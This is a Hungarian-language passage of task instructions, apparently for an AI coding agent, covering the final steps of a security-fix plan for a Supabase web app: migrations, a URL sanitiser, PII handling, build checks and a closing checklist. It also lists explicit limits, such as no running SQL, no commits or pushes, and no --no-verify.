### Lépés 8 — `safeUrl.js` + ProjectDetails / Issues módosítás
Nem szerver-szabály változás, csak kliens. Ennek a sorrendje rugalmas, de logikus után a többinek mellé.

### Lépés 9 — `NewWorkerModal.jsx` refactor (PII profiles-ba)
A `profiles` UPDATE admin-only WITH CHECK-en át fog menni (admin user, admin role).

### Lépés 10 — `20260601_06_protect_sensitive_columns.sql` (érzékeny oszlopok védelme)
Ez törheti a `select('*')` query-ket. **MIELŐTT futtatod, frissítsd a JS query-ket** explicit oszloplistára (lásd #6 javítás végén).

A JS frissítések MIND meglegyenek, deploy-olva, mielőtt ez az SQL fut.

### Lépés 11 — Build + smoke test
```bash
npm run build
npm run preview  # vagy npm run dev
```
Tesztelés: admin + worker mindkét account-tal a fő flow-k (projekt megnyitása, toggleTask, üzenet küldése, profil frissítése, fotó feltöltése).

### Lépés 12 — A user kérésre commit + push
**Te NE pusholj.** Várd meg a user explicit utasítását.

---

## 5. Megerősített tilalmak (NE TEDD!)

- ❌ **NE futtass SQL-t a Supabase ellen.** Csak `.sql` fájlokat generálj.
- ❌ **NE commitolj és NE pusholj** automatikusan. A user kéri majd, ha kéri.
- ❌ **NE törölj** meglévő SQL fájlt (`schema.sql`, `fix_rls_profiles.sql`, stb.). Migrációval írod felül.
- ❌ **NE módosíts** olyan policy-t, ami az adminokat is kizárhatja, anélkül hogy elsőként a 0. lépést ellenőrizted volna a user-rel.
- ❌ **NE használj** `--no-verify` git flag-et, ne kerüld meg a build-et.
- ❌ **NE adj hozzá** új npm dependency-t (kerüld pl. URL parser library-t — natív `URL` van).
- ❌ **NE nyúlj** design CSS-hez, Tailwind config-hoz, vagy a UI label/spacing javításokhoz.
- ❌ **NE adj hozzá** új oszlopokat a `profiles` táblához enélkül, hogy a user explicit kéri. (#7 javítás végén ez nyitott kérdés.)
- ❌ **NE feltételezz** Supabase Dashboard hozzáférést. Minden dashboard-műveletet a user csinál.

---

## 6. Mit írsz a `SECURITY_FIX_PLAN.md`-be (kötelezően!)

Az alábbi szekciókkal:
1. **Áttekintés** — mit fogsz javítani, milyen sorrendben.
2. **Pre-flight checklist** — a Lépés 0 SQL-jét beragasztva, megjelölve hogy ezt a user futtatja.
3. **Manual steps for the user** — minden olyan lépés, amit nem te csinálsz (signup letiltás, storage bucket private, Phase 2 elemek).
4. **File-by-file changes** — minden fájl, és mi változik benne (3-5 sor magyarázat).
5. **Risk register** — minden lépés mellett: mit lehet elrontani, és hogyan rollback.
6. **Phase 2 — out of scope (storage, realtime tightening)** — felsorolva, de nem implementálva.
7. **Open questions** — pl. „A `profiles` táblának vannak ezek az oszlopai? (`tax_id`, `tb_number`, …) Ellenőrizni kell a `schema.sql`-ben, mielőtt a NewWorkerModal-t átírom."

---

## 7. Befejező protokoll

Ha minden migráció és JS módosítás kész, **NE pusholj**. Hagyd a következő állapotot:
- Minden új fájl létrehozva (`supabase/migrations/*.sql`, `src/lib/safeUrl.js`, `SECURITY_FIX_PLAN.md`).
- Minden módosított fájl egyértelműen jelölve a `SECURITY_FIX_PLAN.md`-ben.
- A `git status` mutassa az új és módosított fájlokat, untracked / modified állapotban.
- `npm run build` lefutott, hiba nélkül.

Írj egy záró összefoglalót a user-nek, amiben:
- Felsorolod a létrehozott SQL migrációkat (sorrendben).
- Felsorolod a módosított JS fájlokat.
- Emlékezteted a MANUÁLIS lépésekre (signup off, storage Phase 2).
- Kéred, hogy a 0. lépést (pre-flight SQL) futtassa le először.

**A user ezután átnézi a `SECURITY_FIX_PLAN.md`-t és a migrációkat. Ha jónak találja, ő futtatja le a Supabase SQL Editorban, és ő commitol + pusholja a JS részt.**

---

## 8. Ellenőrzőlista neked, mielőtt befejezed

- [ ] Létezik `SECURITY_FIX_PLAN.md` a repó gyökerében?
- [ ] Minden migráció a `supabase/migrations/` mappában van, `20260601_*` névformával?
- [ ] Minden migráció elején van `-- WHAT / -- WHY / -- ROLLBACK` komment?
- [ ] A `UserContext.jsx` már nem tartalmaz email-hardcode-ot?
- [ ] A `src/lib/safeUrl.js` létezik és exportálja a `safeUrl()` függvényt?
- [ ] A `ProjectDetails.jsx` `handleToggleTask` RPC-t hív?
- [ ] A `ProjectDetails.jsx` és `Issues.jsx` minden `href={...}` `safeUrl()`-en át megy?
- [ ] A `NewWorkerModal.jsx` PII-t a `profiles`-ba ír, nem a `signUp.options.data`-ba?
- [ ] `npm run build` lefutott hibák nélkül?
- [ ] `git status` jól néz ki (csak a szándékolt fájlok módosultak)?
- [ ] Nem pusholtál és nem commitoltál?

Ha minden ✅, akkor írj a usernek és várj utasításra. Sok sikert!
